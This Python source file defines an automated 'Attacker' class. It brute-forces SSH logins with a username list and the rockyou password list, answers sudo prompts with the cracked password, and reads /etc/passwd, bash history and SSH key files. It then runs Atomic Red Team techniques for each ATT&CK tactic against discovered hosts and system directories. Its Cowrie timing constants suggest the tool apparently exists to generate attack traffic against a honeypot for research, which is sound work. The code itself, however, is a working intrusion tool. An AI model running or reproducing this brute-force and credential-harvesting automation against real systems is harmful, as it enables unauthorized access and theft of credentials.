
from typing import Tuple, List, Dict, Union
import re
from time import sleep
from datetime import datetime
from random import randint, shuffle
from threading import Thread
from shlex import quote
import validators
from paramiko import SSHClient, Channel, AutoAddPolicy
from paramiko.channel import ChannelFile
from paramiko.ssh_exception import NoValidConnectionsError, AuthenticationException, SSHException

import response_generator
from tracer import Tracer, LoggingType
from cve2attack import TACTIC_ID2NAME_MAPPING
from atomic import query_available_tests, test_has_argument, query_test_argument_default, sample_test_by_guid
from response_generator import ResponseGenerator
from telenotify import send_text


USERNAME_CANDIDATES = []
PASSWORD_CANDIDATES = []


def load_authentication_candidates() -> None:

    global USERNAME_CANDIDATES, PASSWORD_CANDIDATES

    with open('ref/usernames.txt', 'r') as fin:
        USERNAME_CANDIDATES = [line.strip() for line in fin.readlines()]

    with open('ref/rockyou.txt', 'r') as fin:
        PASSWORD_CANDIDATES = [line.strip() for line in fin.readlines()]


class Attacker:
    SSH_HOST = '192.168.3.2'
    SSH_PORT = 2222
    EXECUTION_TIMEOUT = 30
    MIN_RETRY_TIMES = 3
    MAX_RETRY_TIMES = 5
    TACTIC_REPEAT = 3
    COWRIE_BOOT_TIME = 300
    COWRIE_RETRY_TIME = COWRIE_BOOT_TIME / 3

    @staticmethod
    def retry_times() -> int:

        return randint(Attacker.MIN_RETRY_TIMES, Attacker.MAX_RETRY_TIMES)


    def __init__(self):

        self.logger = Tracer('attacker')
        self.client: Union[SSHClient, None] = None
        self.client_channel: Union[Channel, None] = None
        self.client_io: Union[Tuple[ChannelFile, ChannelFile], None] = None
        self.username = ''
        self.password = ''
        self.knowledge = {'ip': [], 'username': []}

        # Record constants.
        self.logger.log(f'EXECUTION_TIMEOUT = {Attacker.EXECUTION_TIMEOUT}', LoggingType.DEBUG)
        self.logger.log(f'MIN_RETRY_TIMES = {Attacker.MIN_RETRY_TIMES}', LoggingType.DEBUG)
        self.logger.log(f'MAX_RETRY_TIMES = {Attacker.MAX_RETRY_TIMES}', LoggingType.DEBUG)
        self.logger.log(f'TACTIC_REPEAT = {Attacker.TACTIC_REPEAT}', LoggingType.DEBUG)


    def __del__(self):

        self.close_connection()

        if self.logger is not None:
            del self.logger


    def is_client_connected(self, recon: bool = False) -> bool:

        is_con = self.client_io is not None and self.client_channel is not None and self.client is not None

        if not is_con and recon:
            while not is_con:
                self.close_connection()
                sleep(3)
                self.try_login()
                is_con = self.client_io is not None and self.client_channel is not None and self.client is not None

        return is_con


    def close_connection(self) -> None:

        if self.client_io is not None:
            self.client_io = None

        if self.client_channel is not None:
            self.client_channel = None

        if self.client is not None:
            self.client.close()
            self.client = None


    def try_login(self) -> bool:

        print(f'Start trying to login to "{Attacker.SSH_HOST}:{Attacker.SSH_PORT}" .')
        self.logger.log(f'Start trying to login to "{Attacker.SSH_HOST}:{Attacker.SSH_PORT}" .', LoggingType.DEBUG)

        uid = 0

        while uid < len(USERNAME_CANDIDATES):
            pid = 0

            while pid < len(PASSWORD_CANDIDATES):
                username = USERNAME_CANDIDATES[uid]
                password = PASSWORD_CANDIDATES[pid]

                try:
                    self.client = SSHClient()
                    self.client.set_missing_host_key_policy(AutoAddPolicy())
                    self.client.connect(Attacker.SSH_HOST, Attacker.SSH_PORT, username=username, password=password, banner_timeout=300)

                except AuthenticationException:
                    # Switch to next login try.
                    pid += 1

                    print(f'Failed to login with ("{username}", "{password}").')
                    self.logger.log(f'Failed to login with ("{username}", "{password}").', LoggingType.FAILED)
                    self.close_connection()

                except SSHException:
                    print(f'Failed to connect to ssh server due to unexpected error.')
                    self.logger.log(f'Failed to connect to ssh server due to unexpected error.', LoggingType.FATAL)
                    self.close_connection()

                    send_text(f'Failed to connect to ssh server due to unexpected error.')
                    sleep(Attacker.COWRIE_RETRY_TIME)

                except EOFError:
                    print(f'Failed to connect to ssh server due to EOF error.')
                    self.logger.log(f'Failed to connect to ssh server due to EOF error.', LoggingType.FATAL)
                    self.close_connection()

                    send_text(f'Failed to connect to ssh server due to EOF error.')
                    sleep(Attacker.COWRIE_RETRY_TIME)

                except NoValidConnectionsError:
                    print(f'Failed to connect to ssh on {Attacker.SSH_HOST}:{Attacker.SSH_PORT}. Please check these are correct.')
                    self.logger.log(f'Failed to connect to ssh on {Attacker.SSH_HOST}:{Attacker.SSH_PORT}. Please check these are correct.', LoggingType.FATAL)
                    self.close_connection()

                    send_text(f'Failed to connect to ssh on {Attacker.SSH_HOST}:{Attacker.SSH_PORT}.')
                    sleep(Attacker.COWRIE_RETRY_TIME)

                else:
                    self.username = username
                    self.password = password
                    print(f'Logged in with ("{username}", "{password}").')
                    self.logger.log(f'Logged in with ("{username}", "{password}").')

                    try:
                        self.client_channel = self.client.invoke_shell()
                        self.client_io = (self.client_channel.makefile('wb'), self.client_channel.makefile('rb'))

                    except EOFError:
                        print(f'Failed to invoke shell on ssh server. (EOFError)')
                        self.logger.log(f'Failed to invoke shell on ssh server. (EOFError)', LoggingType.FATAL)
                        self.close_connection()

                    except SSHException:
                        print(f'Failed to invoke shell on ssh server. (SSHException)')
                        self.logger.log(f'Failed to invoke shell on ssh server. (SSHException)', LoggingType.FATAL)
                        self.close_connection()

                    else:
                        print(f'Try to get shell prompt ...')
                        has_shell_prompt = self.get_shell_prompt()

                        if has_shell_prompt:
                            print(f'Try to get shell prompt ... Done')
                            self.logger.log(f'Try to get shell prompt ... Done')
                        else:
                            print(f'Try to get shell prompt ... Failed')
                            self.logger.log(f'Try to get shell prompt ... Failed', LoggingType.FATAL)

                        return has_shell_prompt

                sleep(0.5)

            uid += 1

        print('Failed to login with wordlist in username/password files.')
        self.logger.log('Failed to login with wordlist in username/password files.', LoggingType.FAILED)
        return False


    def execute_command__(self, command: str) -> str:

        if self.is_client_connected():
            try:
                print(f'Execute command "{command}".')
                self.logger.log(f'Execute command "{command}".', LoggingType.DEBUG)

                self.client_io[0].write(f'{command}\n'.encode())
                self.client_io[0].flush()

            except OSError:
                print('Executed command failed.')
                self.logger.log('Executed command failed.', LoggingType.FAILED)
                self.close_connection()
                return ''

            else:
                buffer = ''

                try:
                    while self.is_client_connected():
                        line = self.client_io[1].channel.recv(1024)
                        buffer += line.decode()

                        if len(command) > 0 and command in buffer:
                            buffer = buffer[buffer.find(command)+len(command):]
                            command = ''

                        if buffer.endswith(f'[sudo] password for {self.username}: '):
                            self.client_io[0].channel.sendall(self.password.encode() + b'\n')
                            print('Password sent for sudo.')
                            self.logger.log('Password sent for sudo.', LoggingType.DEBUG)

                        if ResponseGenerator.has_prompt(buffer):
                            print('Executed command completed.')
                            self.logger.log('Executed command completed.')

                            for prompt in response_generator.ResponseGenerator.filter_prompt(buffer):
                                pos = buffer.find(prompt.decode())

                                if pos != -1:
                                    buffer = buffer[:pos]

                            buffer = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -/]*[@-~]').sub('', buffer).replace('\x1b[?', '').replace('\b', '').replace('\r', '').strip()
                            buffer_format = buffer.encode()

                            print(f'Exec result: {buffer_format}')
                            self.logger.log(f'Exec result: {buffer_format}', LoggingType.DEBUG)

                            return buffer

                        sleep(0.1)

                    print('Executed command failed. (client disconnected)')
                    self.logger.log('Executed command failed. (client disconnected)', LoggingType.FAILED)
                    self.close_connection()
                    return ''

                except OSError:
                    print('Executed command failed. (OSError)')
                    self.logger.log('Executed command failed. (OSError)', LoggingType.FAILED)
                    self.close_connection()
                    return ''

                except SSHException:
                    print('Executed command failed. (SSHException)')
                    self.logger.log('Executed command failed. (SSHException)', LoggingType.FATAL)
                    self.close_connection()
                    return ''


    def execute_command_(self, command: str, result: list, exit_code: bool = True) -> None:

        if self.is_client_connected():
            resp_command = self.execute_command__(command)

            if exit_code:
                exit_code = self.execute_command__('echo $?')

                if exit_code is not None and exit_code.lstrip('-').isdigit():
                    exit_code = int(exit_code)
                else:
                    exit_code = -1

            else:
                exit_code = -1

            result.append(resp_command)
            result.append(exit_code)


    def execute_command(self, command: str, exit_code: bool = True) -> Tuple[str, int]:

        exec_start = datetime.now()
        result = []

        t = Thread(target=self.execute_command_, args=(command, result, exit_code))
        t.start()

        while len(result) == 0 and (datetime.now() - exec_start).total_seconds() < Attacker.EXECUTION_TIMEOUT:
            sleep(0.5)

        if len(result) > 0:
            return result[0], result[1]
        else:
            print('Timeout for execution.')
            self.logger.log('Timeout for execution.', LoggingType.FAILED)

            # Close the connection to force stop IO waiting in execute_command_() .
            self.close_connection()

            return '', -1


    def get_shell_prompt_(self, result: list) -> None:

        while self.is_client_connected():
            line = self.client_io[1].channel.recv(1024)

            if response_generator.ResponseGenerator.has_prompt(line):
                result.append(True)
                break

            sleep(0.1)


    def get_shell_prompt(self) -> bool:

        exec_start = datetime.now()
        result = []

        t = Thread(target=self.get_shell_prompt_, args=(result,))
        t.start()

        while len(result) == 0 and (datetime.now() - exec_start).total_seconds() < Attacker.EXECUTION_TIMEOUT:
            sleep(0.5)

        if len(result) == 0:
            # Close the connection to force stop IO waiting in execute_command_() .
            self.close_connection()

        return len(result) > 0


    def execute_command_by(self, executor: str, command: str) -> Tuple[str, int]:
        
        if executor == 'command_prompt':
            executor = 'pwsh'

        if executor == 'bash' or executor == 'sh' or executor == 'pwsh':
            pass
        else:
            print(f'The executor "{executor}" is not supported, it may encountered an error.')
            self.logger.log(f'The executor "{executor}" is not supported, it may encountered an error.', LoggingType.DEBUG)

        composed_command = f'{executor} -c {quote(command)}'

        return self.execute_command(composed_command)


    def update_network(self, discon_retry: bool) -> Union[None, Tuple[str, str]]:

        if not self.is_client_connected(discon_retry):
            return None

        stdout, exit_code = self.execute_command('ls /sys/class/net/')

        if exit_code == 0:
            interfaces = stdout.split()

            for interface in interfaces:
                if not self.is_client_connected(discon_retry):
                    return None

                stdout, exit_code = self.execute_command(f"ip addr show {interface} | grep 'inet\\b' | awk '{{print $2}}' | cut -d/ -f1")
                stdout = stdout.strip()

                if exit_code == 0 and len(stdout) > 0:
                    for token in stdout.split():
                        if validators.ipv4(token) and not token.startswith('127.'):
                            return interface, token


    def update_arguments(self, discon_retry: bool) -> Dict[str, str]:

        arguments = {'username': self.username, 'password': self.password,
                     'interface': '', 'ip': '', 'hostname': '', 'full_domain': '', 'dc_name': ''}

        # Update interface and ip.
        for i in range(Attacker.retry_times()):
            if not self.is_client_connected(discon_retry):
                return {}

            network = self.update_network(discon_retry)

            if network is not None:
                arguments['interface'] = network[0]
                arguments['ip'] = network[1]

                interface_bytes = network[0].encode()
                ip_bytes = network[1].encode()

                print(f'Argument (interface, ip) is updated to ({interface_bytes}, {ip_bytes}).')
                self.logger.log(f'Argument (interface, ip) is updated to ({interface_bytes}, {ip_bytes}).', LoggingType.DEBUG)

                break

        # Update hostname.
        for i in range(Attacker.retry_times()):
            if not self.is_client_connected(discon_retry):
                return {}

            stdout, exit_code = self.execute_command('hostname | cut -d. -f1')

            if exit_code == 0 and len(stdout) > 0:
                hostname = stdout.strip()
                hostname_bytes = hostname.encode()

                arguments['hostname'] = hostname
                print(f'Argument hostname is updated to "{hostname_bytes}".')
                self.logger.log(f'Argument hostname is updated to "{hostname_bytes}".', LoggingType.DEBUG)

                break

        # Update full_domain.
        for i in range(Attacker.retry_times()):
            if not self.is_client_connected(discon_retry):
                return {}

            stdout, exit_code = self.execute_command('hostname | cut -d. -f2-')

            if exit_code == 0 and len(stdout) > 0:
                full_domain = stdout.strip()
                full_domain_bytes = full_domain.encode()

                arguments['full_domain'] = full_domain
                print(f'Argument full_domain is updated to "{full_domain_bytes}".')
                self.logger.log(f'Argument full_domain is updated to "{full_domain_bytes}".', LoggingType.DEBUG)

                break

        # TODO: Update dc_name.

        arguments_bytes = {k: v.encode('utf-8') for k, v in arguments.items()}
        print(f'Argument is updated to "{arguments_bytes}".')
        self.logger.log(f'Argument is updated to "{arguments_bytes}".', LoggingType.DEBUG)

        if len(arguments['interface']) == 0 or len(arguments['ip']) == 0 or len(arguments['hostname']) == 0:
            return {}
        else:
            return arguments


    def collect_info(self, discon_retry: bool) -> None:

        # Collect usernames.
        if not self.is_client_connected(discon_retry):
            return None

        stdout, exit_code = self.execute_command('cut -d: -f1 /etc/passwd')

        if exit_code == 0:
            usernames = stdout.split()
            self.knowledge['username'] += usernames


        # Dig something.
        collectors = ['ip a', 'cat ~/.bash_history | grep -v ^#', 'cat .ssh/known_hosts', 'cat .ssh/authorized_keys']

        for collector in collectors:
            if not self.is_client_connected(discon_retry):
                return None

            stdout, exit_code = self.execute_command(collector)

            if exit_code == 0:
                self.update_knowledge(stdout)


    def update_knowledge(self, output: str) -> bool:

        has_update = False

        # Update ip.
        for token in output.split():
            if validators.ipv4(token) and token not in self.knowledge['ip']:
                self.knowledge['ip'].append(token)
                has_update = True

        return has_update


    def _extend_argument(self, arguments_collect: List[Dict[str, str]], arg_name: str, arg_values: List[str]) -> List[Dict[str, str]]:

        arguments_collect_ = []

        for args in arguments_collect:
            if arg_name in args:
                arguments_collect_.append(args)
            else:
                arguments_collect_ += [{**args, arg_name: arg_value} for arg_value in arg_values]

        return arguments_collect_


    def extend_argument(self, test_guid: str, arguments: Dict[str, str]) -> List[Dict[str, str]]:

        arguments_collect = [arguments.copy(), ]

        if test_has_argument(test_guid, 'file_path'):
            arguments_collect = self._extend_argument(arguments_collect, 'file_path',
                                                      ['.', '~', '/etc', '/home', '/root', '/var', '/'])

        if test_has_argument(test_guid, 'search_path'):
            arguments_collect = self._extend_argument(arguments_collect, 'search_path',
                                                      ['.', '~', '/etc', '/home', '/root', '/var', '/'])

        if test_has_argument(test_guid, 'target_host'):
            arguments_collect = self._extend_argument(arguments_collect, 'target_host',
                                                      ['127.0.0.1'] + self.knowledge['ip'])

        return arguments_collect


    def do_attack_check_dependencies(self, executor: str, dependencies: List[List[List[str]]]) -> bool:

        for depend in dependencies:
            if not self.is_client_connected():
                return False

            pre_checks = depend[0]
            setups = depend[1]

            is_check_pass = True

            # Check each pre-check.
            for i, pre_check in enumerate(pre_checks):
                if not self.is_client_connected():
                    return False

                stdout, exit_code = self.execute_command_by(executor, pre_check)

                # This pre-check failed, so run setup.
                if exit_code != 0:
                    print(f'Dependency[{i}] Failed to pass pre-check.')
                    self.logger.log(f'Dependency[{i}] Failed to pass pre-check.', LoggingType.FAILED)

                    is_check_pass = False
                    break

                else:
                    print(f'Dependency[{i}] Passed pre-check.')
                    self.logger.log(f'Dependency[{i}] Passed pre-check.')

            # Some pre-check failed, so run setup.
            if not is_check_pass:
                for i, setup in enumerate(setups):
                    exit_code = -1

                    for j in range(Attacker.retry_times()):
                        if not self.is_client_connected():
                            return False

                        stdout, exit_code = self.execute_command_by(executor, setup)

                        if exit_code == 0:
                            break

                    # Failed to set up.
                    if exit_code != 0:
                        print(f'Setup[{i}] Failed to setup for dependencies.')
                        self.logger.log(f'Setup[{i}] Failed to setup for dependencies.', LoggingType.FAILED)
                        return False
                    else:
                        print(f'Setup[{i}] Success to setup for dependencies.')
                        self.logger.log(f'Setup[{i}] Success to setup for dependencies.')

                print(f'Success to run all setup for dependencies.')
                self.logger.log(f'Success to run all setup for dependencies.')

        return True


    def do_attack_run_commands(self, executor: str, commands: List[str]) -> Tuple[bool, str]:

        stdout_collect = ''

        for i, command in enumerate(commands):
            if not self.is_client_connected():
                return False, ''

            exit_code = -1

            # Try to run command.
            for j in range(Attacker.retry_times()):
                if not self.is_client_connected():
                    return False, ''

                stdout, exit_code = self.execute_command_by(executor, command)
                stdout_collect += stdout

                if exit_code == 0:
                    break

            # Failed to run command.
            if exit_code != 0:
                print(f'Command[{i}] Failed to run.')
                self.logger.log(f'Command[{i}] Failed to run.', LoggingType.FAILED)
                return False, stdout_collect
            else:
                print(f'Command[{i}] Success to run.')
                self.logger.log(f'Command[{i}] Success to run.')

        return True, stdout_collect


    def do_attack_run_cleanups(self, executor: str, commands: List[str]) -> bool:

        for i, command in enumerate(commands):
            if not self.is_client_connected():
                return False

            exit_code = -1

            # Try to clean up.
            for j in range(Attacker.retry_times()):
                if not self.is_client_connected():
                    return False

                stdout, exit_code = self.execute_command_by(executor, command)

                if exit_code == 0:
                    break

            # Failed to clean up.
            if exit_code != 0:
                print(f'Cleanups[{i}] Failed to do cleanups.')
                self.logger.log(f'Cleanups[{i}] Failed to do cleanups.', LoggingType.FAILED)
                return False
            else:
                print(f'Cleanups[{i}] Success to do cleanups.')
                self.logger.log(f'Cleanups[{i}] Success to do cleanups.')

        return True


    def do_attack(self, cve_id: str, tactic_technique: List[List[str]], discon_retry: bool) -> None:

        print(f'Running CVE "{cve_id}" ...')
        self.logger.log(f'Running CVE "{cve_id}" ...', LoggingType.DEBUG)

        if self.try_login():
            # (1) Get essential info.
            print('Updating arguments ...')
            self.logger.log('Updating arguments ...', LoggingType.DEBUG)
            ARGUMENTS = self.update_arguments(discon_retry)
            print('Updating arguments ... Done')
            self.logger.log('Updating arguments ... Done', LoggingType.DEBUG)

            if len(ARGUMENTS.keys()) > 0:
                # (2) Collect basic info.
                print('Collect basic info ...')
                self.logger.log('Collect basic info ...', LoggingType.DEBUG)
                self.collect_info(discon_retry)
                print('Collect basic info ... Done')
                self.logger.log('Collect basic info ... Done', LoggingType.DEBUG)

                # (3) Do attack by the order of tactic.
                for tactic_id, techniques in enumerate(tactic_technique):
                    if not self.is_client_connected(discon_retry): break

                    tactic_name = TACTIC_ID2NAME_MAPPING[tactic_id]

                    # (4) Do each tactic for many times.
                    if len(techniques) > 0:
                        for i in range(Attacker.TACTIC_REPEAT):
                            if not self.is_client_connected(discon_retry): break

                            print(f'- Running tactic "{tactic_name}" [{i + 1}/{Attacker.TACTIC_REPEAT}] ...')
                            self.logger.log(f'- Running tactic "{tactic_name}" [{i + 1}/{Attacker.TACTIC_REPEAT}] ...', LoggingType.DEBUG)

                            shuffle(techniques)

                            # (5) Do attack by techniques.
                            for technique in techniques:
                                if not self.is_client_connected(discon_retry): break

                                print(f'-- Running technique "{technique}" ...')
                                self.logger.log(f'-- Running technique "{technique}" ...', LoggingType.DEBUG)

                                tests = query_available_tests(technique)
                                shuffle(tests)

                                # (6) Do attack by tests.
                                for test_guid in tests:
                                    if not self.is_client_connected(discon_retry): break

                                    print(f'--- Running test "{test_guid}" ...')
                                    self.logger.log(f'--- Running test "{test_guid}" ...', LoggingType.DEBUG)

                                    arguments_collect = self.extend_argument(test_guid, ARGUMENTS)

                                    # (7) Some arguments are multivalued, so do all possible values.
                                    for j, arguments in enumerate(arguments_collect):
                                        if not self.is_client_connected(discon_retry): break

                                        print(f'---- Running test "{test_guid}" with argument [{j+1}/{len(arguments_collect)}] ...')
                                        self.logger.log(f'---- Running test "{test_guid}" with argument [{j+1}/{len(arguments_collect)}] ...', LoggingType.DEBUG)

                                        dependencies, executor, commands, cleanups = sample_test_by_guid(test_guid, arguments)
                                        output_file = query_test_argument_default(test_guid, 'output_file')

                                        # (8-1) Check dependencies.
                                        if self.do_attack_check_dependencies(executor, dependencies):
                                            print('All dependencies passed check.')
                                            self.logger.log('All dependencies passed check.')

                                            # (8-2) Execute commands.
                                            is_success, output = self.do_attack_run_commands(executor, commands)

                                            # (8-3) Check result.
                                            if is_success:
                                                print('All commands run successfully.')
                                                self.logger.log('All commands run successfully.')

                                                if len(output_file) > 0:
                                                    stdout, exit_code = self.execute_command_by(executor, f'cat {quote(output_file)}')

                                                    if exit_code == 0:
                                                        output += '\n' + stdout

                                                if self.update_knowledge(output):
                                                    print('Knowledge is updated.')
                                                    self.logger.log('Knowledge is updated.')

                                            else:
                                                print('Some commands run failed.')
                                                self.logger.log('Some commands run failed.', LoggingType.FAILED)

                                            # (8-4) Execute cleanups.
                                            self.do_attack_run_cleanups(executor, cleanups)

                                        else:
                                            print('Some dependencies NOT passed check.')
                                            self.logger.log('Some dependencies NOT passed check.', LoggingType.FAILED)

                                        print(f'---- Running test "{test_guid}" with argument [{j + 1}/{len(arguments_collect)}] ... Done')
                                        self.logger.log(f'---- Running test "{test_guid}" with argument [{j + 1}/{len(arguments_collect)}] ... Done', LoggingType.DEBUG)

                                    print(f'--- Running test "{test_guid}" ... Done')
                                    self.logger.log(f'--- Running test "{test_guid}" ... Done', LoggingType.DEBUG)

                                print(f'-- Running technique "{technique}" ... Done')
                                self.logger.log(f'-- Running technique "{technique}" ... Done', LoggingType.DEBUG)

                            print(f'- Running tactic "{tactic_name}" [{i + 1}/{Attacker.TACTIC_REPEAT}] ... Done')
                            self.logger.log(f'- Running tactic "{tactic_name}" [{i + 1}/{Attacker.TACTIC_REPEAT}] ... Done', LoggingType.DEBUG)

                    else:
                        print(f'- Running tactic "{tactic_name}" ... (Empty)')
                        self.logger.log(f'- Running tactic "{tactic_name}" ... (Empty)', LoggingType.DEBUG)

            else:
                print('Failed to get important attributes.')
                self.logger.log('Failed to get important attributes.', LoggingType.FAILED)

        else:
            print('Failed to login or get shell from the server.')
            self.logger.log('Failed to login or get shell from the server.', LoggingType.FAILED)

        print(f'Running CVE "{cve_id}" ... Done')
        self.logger.log(f'Running CVE "{cve_id}" ... Done', LoggingType.DEBUG)


load_authentication_candidates()
